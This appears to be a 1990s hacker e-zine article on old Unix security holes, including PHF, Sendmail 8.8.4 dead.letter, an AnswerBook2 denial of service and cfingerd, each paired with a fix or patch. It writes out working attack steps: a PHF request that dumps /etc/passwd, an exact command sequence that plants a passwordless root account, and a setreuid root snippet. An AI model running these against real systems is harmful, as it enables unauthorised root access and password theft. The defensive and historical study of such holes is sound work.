@@ -1,0 +1,331 @@
+
+                       :..::..File 5 Of 11.::..:
+                       :..Unix Security Holes..:
+                       :.::...By CrossFire..::.:
+
+<*> Introduction
+----------------
+
+Ok, for like a year now I have been going on about ethical hacking, and
+being the person fighting back and shit like that, so now, I have
+decided to write something about Unix Security Holes, how they work,
+and how to fix them. Please note, this intended as an article on how to
+fix security holes, not as a cookbook for budding uebercrackers.
+
+The Famous PHF Hole
+-------------------
+
+The PHF hole is about the most well known security hole in the
+universe, although now you will be hard pushed to find a server that is
+vulnerable. This hole works because of the file phf.cgi that is in the
+cgi- bin directory of the apache web server. The basic function of
+phf.cgi is to let a remote user execute arbitary commands on the server
+machine, the most common of these is to view the password file.
+
+How to use this hole
+
+To test if your machine is vulnerable to this hole, go into a web
+browser and in the location bar type:
+
+http://www.yourdomain.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+If you are vulnerable to this hole, you will see something like:
+
+root:2fkbNba29uWys:0:1:Operator:/:/bin/csh
+www-admin:rYsKMjnvRppro:100:11:WWW admin:/home/Common/WWW:/bin/csh
+
+Otherwise you will see an error message saying that phf.cgi was not
+found on the server, or you don't have permission to view phf.cgi on
+this server. 
+
+How to fix this hole
+
+This is the obvious part, off the top of my head, I can think of 2 ways
+to fix this on your server, these are: rm phf.cgi, or while root, chmod
+700 /cgi-bin/phf.cgi (you must be in the root dir of the server to do
+this).
+
+The Deadletter Exploit
+----------------------
+
+Deadletter Exploit for Sendmail 8.8.4 
+Version affected: 8.8.4 
+
+Ok, here's a brief and interesting explonation of this famous exploit.
+This exploit uses sendmail version 8.8.4 and it requires that you have
+a shell acount on the server in question. The exploit creates a link
+from /etc/passwd to /var/tmp/dead.letter Very simple really. Here's how
+it works, below are the exact commands as you have to type them.
+
+  ln /etc/passwd /var/tmp/dead.letter 
+  telnet target.host 25  
+  helo <domain-name>
+  mail from: frostiez@bah-bah.net 
+  rcpt to: masterbah@hotmail.com  
+  data
+  frostiez::0:0:Mr Frostiez:/root:/bin/bash
+  .
+  quit   
+
+Then, when you're done, telnet to port 23 and log in as frostiez, no
+password required. Thanx to a little bit of work we did, frostiez just
+happens to have the same priviledges as root. There are a couple of
+reasons why this might not work:
+
+1) /var and / are different partitions (as you already know, you can't
+make hard links between different partitions).
+2) There is a postmaster account on a machine or mail alias, in which
+case, your mail will end up there instead of being written to an
+/etc/passwd.
+3) /var/tmp doesn't exist or isn't publicly writable.
+
+How to fix this Hole
+
+Login as root at your system, then 
+
+     cd /var/tmp     ls -l
+
+If there is a dead letter already, you are safe. Don't delete that one.
+If there NO dead.letter, type:
+
+     touch dead.letter
+     chmod 600 dead.letter
+ 
+This will create a dead.letter of null length. Now it is impossible to
+hardlink /etc/passwd against /var/tmp/dead.letter. This exploit will
+not work any more. 
+
+AnswerBook2 Exploit - Solaris Only
+----------------------------------
+
+This exploit was blatantly nicked from a sun security list, and is in
+letter form.
+
+Hello,
+
+already in December 1997 I discovered a serious bug in the AnswerBook2
+server dwhttpd/3.1a4 that ships with Solaris 2.6 (server edition). With
+a simple socket connection to the AB2 port (default: 8888), *anyone* on
+the network with access to that port (default: everybody, see below)
+can bring the server to spin and deny further responses:
+
+- --- snip ---
+  HTTP/1.0 500 Server Error
+  Server: dwhttpd/3.1a4 (Inso; sun5)
+  [...]
+
+  The server currently lacks the resources needed to handle your
+  request. Please try again later.
+- --- snip ---
+
+The affected dwhttpd process will eat one cpu, with possible impact on
+other services. (MP machines will still have some cpus available.)
+
+I reported this to Sun who filed a bug report
+
+       bug/sherlock/server/4099376
+       HTTP 1.0 HEAD request brings the dwhttpd to spin
+
+and assigned priority "fix within 3 months". AB2 technology is a
+third-party product, so Sun filed a bug with Inso who provides dwhttpd
+as part of their DynaWeb toolkit. Five months later (!) now they
+finally claim: It's fixed in dwhttpd/4.0 which will ship with Solaris
+2.7. Still no patch for the existing AB2 package!
+
+What you can do:
+
+Q: Do I run dwhttpd?
+A: Check for packages SUNWab2r, SUNWab2s and SUNWab2u.
+   Check if dwhttpd is invoked at system startup (/etc/rc2.d/S96ab2mgr)
+   Check with "ps -ef | grep dwhttpd"
+
+Q: Is my AB2 server really vulnerable?
+A: If you don't believe it, check yourself - the source code for a
+   sample "AB2 DoS attack program" (that I gave Sun to reproduce the
+   bug) is included in the bug report (wow - Sun publishes exploit
+   scripts!).
+
+Q: I'm vulnerable - what can I do?
+A: 1. The only real fix is "/etc/init.d/ab2mgr stop" (which is a DoS
+   itself :)
+   2. Restrict the access to your AB2 server port to particular clients
+   (e.g. intranet only) by tcp-wrapper or firewall setup.
+   3. Get nervous, call Sun, request a patch for this bug now.
+
+
+I hope we can get Sun/Inso to produce a *patch* soon. If there are any
+substantial news I will summarize again.
+
+Best regards,
+Thomas
+
+CFingerd Exploit
+----------------
+(taken from rootshell)
+
+SUMMARY
+-------
+
+I have found out that cfingerd 1.3.2 contains a security hole that
+could lead to easy root compromise for any user that has an account on
+the local machine, but only if ALLOW_EXECUTION is set in
+/etc/cfingerd/cfingerd.conf.  By default, this option is DISABLED in
+Debian GNU/Linux.
+
+DETAILS
+-------
+
+The ALLOW_EXECUTION option permits any user on the system to execute a
+program when their username is fingered.  cfingerd needs to run as
+root but doesn't properly throw away root permissions when it starts
+up the user's script.
+
+When it is told to invoke /usr/bin/id from a user's script, it
+produces:
+
+uid=0(root) gid=0(root) euid=65534(nobody) groups=0(root)
+
+EXPLOIT
+-------
+
+Have it exec this:
+
+void main(void) {
+  setreuid(0, 0);
+  system("/usr/bin/id");
+}
+
+Of course, system can exec any more devious command you chose -- ie,
+marking a shell setuid root, etc.  (Can also be done with C calls.)
+No, I am NOT going to tell you how to make a setuid shell. If you
+don't know, you shouldn't be reading this.
+
+To test the exploit, put something like this in ~/.project:
+
+$exec /home/jgoerzen/test
+
+and set the ALLOW_EXECUTION to be enabled.  This will give root for
+everything.
+
+Additionally, as you can tell, it fails to relenquish group
+permissions at all.  After applying the below fix, the new output is:
+
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+
+Much better!
+
+FIX
+---
+
+Debian GNU/Linux comes with cfingerd, but in its default
+configuration, it is safe.  For maximum security, please install the
+upgraded packages anyway.  cfingerd greater than or equal to
+1.3.2-11.0 will have the fix.  I have uploaded the fixed packages to
+Incoming; before they propogate to the mirrors, you may find them at
+http://happy.cs.twsu.edu/~jgoerzen/cfingerd/ along with the new
+sources.
+
+374531a02be81021ca9a12059a3c4515  cfingerd_1.3.2-11.0.diff.gz
+f8819601f85115c063d5cace970554d6  cfingerd_1.3.2-11.0.dsc
+2f943297e0b73fe32345e932f11b6a58  cfingerd_1.3.2-11.0_i386.changes
+b9df424d723da39aa9c0067171822d56  cfingerd_1.3.2-11.0_i386.deb
+4a3403d2519fea6b829bdeda9026c8ad  cfingerd_1.3.2-11.0_i386.upload
+
+Those of you not using Debian may apply the following diff.
+
+--- cfingerd-1.3.2.orig/src/privs.h
++++ cfingerd-1.3.2/src/privs.h
+@@ -29,6 +29,7 @@
+ #ifndef _USE_BSD
+ #define _USE_BSD 1
+ #include <unistd.h>
++#include <grp.h>
+ #undef _USE_BSD
+ #else
+ #include <unistd.h>
+@@ -72,14 +73,20 @@
+ extern
+ #endif
+ gid_t real_gid, effective_gid;
++#ifndef MAIN
++extern
++#endif
++gid_t grouplist[1];
+
+ #define RELINQUISH_PRIVS { \
+                              real_uid = getuid(); \
+                              effective_uid = NOBODY_UID; \
+                              real_gid = getgid(); \
+                              effective_gid = NOBODY_GID; \
+-                             setregid(real_gid, effective_gid); \
+-                             setreuid(real_uid, effective_uid); \
++                             grouplist[0] = effective_gid; \
++                             setgroups(1, grouplist); \
++                             setregid(effective_gid, effective_gid); \
++                             setreuid(effective_uid, effective_uid); \
+                          }
+
+ #define PRIV_ROOT_START {\
+@@ -87,25 +94,29 @@
+                            setregid(effective_gid, real_gid); \
+
+ #define PRIV_ROOT_END \
+-                           setregid(real_gid, effective_gid); \
+-                           setreuid(real_uid, effective_uid); \
++                           setregid(effective_gid, effective_gid); \
++                           setreuid(effective_uid, effective_uid); \
+                        }
+
+ #define USER_PRIVS(a,b) {\
+-                       setreuid(real_uid, 0); \
+-                       setregid(real_gid, 0); \
++                       setreuid(0, 0); \
++                       setregid(0, 0); \
+                        effective_uid = (a); \
+                        effective_gid = (b); \
+-                       setregid(real_gid, effective_gid); \
+-                       setreuid(real_uid, effective_uid); \
++                       grouplist[0] = effective_gid; \
++                       setgroups(1, grouplist); \
++                       setregid(effective_gid, effective_gid); \
++                       setreuid(effective_uid, effective_uid); \
+                    }
+
+ #define NOBODY_PRIVS \
+-                       setreuid(real_uid, 0); \
+-                       setregid(real_gid, 0); \
++                       setreuid(0, 0); \
++                       setregid(0, 0); \
+                        effective_uid = NOBODY_UID; \
+                        effective_gid = NOBODY_GID; \
+-                       setreuid(real_uid, effective_uid); \
+-                       setregid(real_gid, effective_gid);
++                       grouplist[0] = NOBODY_GID; \
++                       setgroups(1, grouplist); \
++                       setgid(NOBODY_GID); \
++                       setuid(NOBODY_UID);
+
+ #endif  /* _PRIVS_H_ */
+
+ADDITIONAL CREDIT goes to Jakob Bohm Jensen <jbj@image.dk>.  He
+reported some other things (not these in particular) that didn't turn
+out to be a hole but lead me to examine the code carefully.
+
+John Goerzen Linux, consulting & programming jgoerzen@complete.org    |
+Developer, Debian GNU/Linux (Free powerful OS upgrade) www.debian.org |
++---------------------------------------------------------------------+
+Visit the Air Capital Linux Users Group on the web at:
+
+http://www.aclug.org
+
+Conclusion
+----------
+
+I Hope this article has enlightened you to certain security holes and
+how to fix them, for further info on security holes, check out
+www.rootshell.com or www.geek-girl.org/bugtraq.
+
+XFire
+crossfire@hackers-uk.freeserve.co.uk
+
+                       :..::..End Of File..::..:
